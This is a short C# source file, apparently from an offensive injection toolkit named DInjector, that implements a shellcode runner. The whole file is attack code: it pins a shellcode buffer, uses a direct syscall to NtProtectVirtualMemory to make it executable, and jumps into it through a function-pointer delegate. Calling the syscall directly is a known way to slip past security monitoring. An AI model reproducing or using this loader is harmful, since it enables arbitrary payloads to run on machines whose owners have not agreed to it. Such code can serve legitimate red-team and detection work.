using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class FunctionPointerUnsafe
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static void Execute(byte[] shellcode, bool debug = false)
        {
            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    IntPtr baseAddress = (IntPtr)ptr;

                    #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

                    IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
                    IntPtr protectAddress = baseAddress;
                    IntPtr regionSize = (IntPtr)shellcode.Length;
                    uint oldProtect = 0;

                    var ntstatus = Syscalls.NtProtectVirtualMemory(
                        hProcess,
                        ref protectAddress,
                        ref regionSize,
                        DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                        ref oldProtect);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine("(FunctionPointerUnsafe) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
                    else
                        throw new Exception($"(FunctionPointerUnsafe) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

                    #endregion

                    pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
                    f();
                }
            }
        }
    }
}
